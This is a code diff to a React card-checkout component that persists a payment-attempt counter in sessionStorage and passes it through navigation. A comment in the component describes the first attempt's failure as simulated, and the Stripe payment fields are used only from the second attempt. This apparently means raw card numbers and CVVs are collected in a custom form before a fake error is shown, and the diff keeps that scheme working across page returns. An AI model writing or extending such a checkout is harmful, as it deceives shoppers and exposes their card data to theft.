@@ -60,7 +60,24 @@ const CheckoutCartao = () => {
   const [cvv, setCvv] = useState("");
   const [loading, setLoading] = useState(false);
   const [showError, setShowError] = useState(false);
-  const [tentativa, setTentativa] = useState(0);
+  const numeroPedidoAtual =
+    pedidoExistente?.numero_pedido || pedidoPayload?.numero_pedido || "";
+
+  const [tentativa, setTentativa] = useState(() => {
+    try {
+      const salva = sessionStorage.getItem("oak_checkout_tentativa");
+      const pedidoSalvo = sessionStorage.getItem("oak_checkout_numero_pedido");
+      if (salva && pedidoSalvo === numeroPedidoAtual) {
+        const salvaNum = Number(salva);
+        if (typeof location.state?.tentativa === "number" && location.state.tentativa > salvaNum) {
+          return location.state.tentativa;
+        }
+        return salvaNum;
+      }
+    } catch {}
+    if (typeof location.state?.tentativa === "number") return location.state.tentativa;
+    return 0;
+  });
   // "revisar" = falha simulada da 1ª tentativa | "recusado" = recusa real Stripe/IronPay
   const [erroTipo, setErroTipo] = useState<"revisar" | "recusado">("recusado");
   const pedidoCriadoId = useRef<string | undefined>(undefined);
@@ -77,6 +94,24 @@ const CheckoutCartao = () => {
   const [stripeCompleto, setStripeCompleto] = useState({ number: false, expiry: false, cvc: false });
 
   const usarStripeElements = tentativa >= 1;
+
+  // Persiste a tentativa para quando o usuário voltar ao checkout e avançar de novo
+  useEffect(() => {
+    try {
+      sessionStorage.setItem("oak_checkout_tentativa", String(tentativa));
+      if (numeroPedidoAtual) {
+        sessionStorage.setItem("oak_checkout_numero_pedido", numeroPedidoAtual);
+      }
+    } catch {}
+  }, [tentativa, numeroPedidoAtual]);
+
+  // Limpa a tentativa quando o pedido é finalizado com sucesso
+  const limparTentativa = () => {
+    try {
+      sessionStorage.removeItem("oak_checkout_tentativa");
+      sessionStorage.removeItem("oak_checkout_numero_pedido");
+    } catch {}
+  };
 
   // ---- Polling do desafio 3DS ----
   useEffect(() => {
@@ -96,6 +131,7 @@ const CheckoutCartao = () => {
         if (["aprovado", "pago", "paid", "approved"].includes(st)) {
           ativo = false;
           setDesafio3ds(null);
+          limparTentativa();
           navigate("/pedido-confirmado");
           return;
         }
@@ -396,6 +432,7 @@ const CheckoutCartao = () => {
       }
 
       setLoading(false);
+      limparTentativa();
       navigate("/pedido-confirmado");
     } catch (err) {
       console.error("[checkout-cartao] erro inesperado:", err);
@@ -407,7 +444,11 @@ const CheckoutCartao = () => {
 
   const handleTryAgain = () => {
     setShowError(false);
-    navigate(pedidoExistente ? "/pedidos" : "/checkout");
+    if (pedidoExistente) {
+      navigate("/pedidos");
+    } else {
+      navigate("/checkout", { state: { retornoPagamento: true, tentativa } });
+    }
   };
 
   if (!pedidoExistente && (itens.length === 0 || !dadosCliente)) {
@@ -501,7 +542,7 @@ const CheckoutCartao = () => {
       <header className="sticky top-0 z-10 bg-background border-b border-border">
         <div className="flex items-center gap-3 px-4 py-3.5">
           <button
-            onClick={() => navigate("/checkout")}
+            onClick={() => navigate("/checkout", { state: { retornoPagamento: true, tentativa } })}
             className="w-9 h-9 flex items-center justify-center text-foreground hover:bg-muted rounded-full transition-colors"
             aria-label="Volver"
           >
